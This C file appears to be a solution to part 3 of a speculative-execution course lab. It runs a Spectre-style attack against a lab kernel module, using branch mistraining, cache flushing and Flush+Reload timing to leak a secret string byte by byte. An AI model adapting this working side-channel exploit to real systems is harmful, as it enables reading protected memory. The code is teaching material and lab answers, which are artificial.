/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define CACHE_HIT_THRESHOLD 105
#define NUM_TRIALS 1000
#define TRAIN_ROUNDS 6
#define MAX_ATTEMPTS 15
#define NULL_CONFIRM_THRESHOLD 7
#define MIN_SECRET_LEN 13
#define MAX_FULL_RETRIES 1

#define THRASH_SIZE (8 * 1024 * 1024)
static char thrash_buf[THRASH_SIZE];

static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;
    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

static void flush_shared_memory(char *shared_memory) {
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
    }
    __asm__ volatile("mfence" ::: "memory");
}

static void thrash_cache(void) {
    volatile int sink = 0;
    for (int i = 0; i < THRASH_SIZE; i += 64) {
        sink += thrash_buf[i];
    }
    (void)sink;
}

static void reload_and_score(char *shared_memory, int *scores) {
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        int idx = ((i * 167) + 13) % SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES;
        uint64_t t = time_access(&shared_memory[idx * SHD_SPECTRE_LAB_PAGE_SIZE]);
        if (t < CACHE_HIT_THRESHOLD) {
            scores[idx]++;
        }
    }
}

static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t secret_offset) {
    int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};

    for (int trial = 0; trial < NUM_TRIALS; trial++) {
        flush_shared_memory(shared_memory);

        for (int t = 0; t < TRAIN_ROUNDS; t++) {
            call_kernel_part3(kernel_fd, shared_memory, t % 4);
        }

        flush_shared_memory(shared_memory);
        thrash_cache();

        call_kernel_part3(kernel_fd, shared_memory, secret_offset);

        __asm__ volatile("mfence" ::: "memory");

        reload_and_score(shared_memory, scores);
        flush_shared_memory(shared_memory);
    }

    unsigned char best = 0;
    for (int i = 1; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        if (scores[i] > scores[best]) {
            best = (unsigned char)i;
        }
    }
    return best;
}

static unsigned char leak_byte_confirmed(int kernel_fd, char *shared_memory, size_t secret_offset) {
    int byte_counts[256] = {0};

    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        unsigned char b = leak_byte(kernel_fd, shared_memory, secret_offset);
        byte_counts[b]++;
    }

    unsigned char best_nonzero = 1;
    for (int i = 2; i < 256; i++) {
        if (byte_counts[i] > byte_counts[best_nonzero]) {
            best_nonzero = (unsigned char)i;
        }
    }

    if (byte_counts[best_nonzero] == 0) {
        return '\x00';
    }
    if (byte_counts[0] >= byte_counts[best_nonzero] + NULL_CONFIRM_THRESHOLD) {
        return '\x00';
    }

    return best_nonzero;
}

int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];

    printf("Launching attacker\n");

    memset(thrash_buf, 1, THRASH_SIZE);
    init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);

    for (size_t i = 0; i < SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1; i++) {
        unsigned char b = leak_byte_confirmed(kernel_fd, shared_memory, i);
        leaked_str[i] = (char)b;
        printf("[+] Offset %zu: 0x%02x ('%c')\n", i, b,
               (b >= 32 && b < 127) ? b : '.');
        if (b == '\x00') {
            leaked_str[i] = '\0';
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
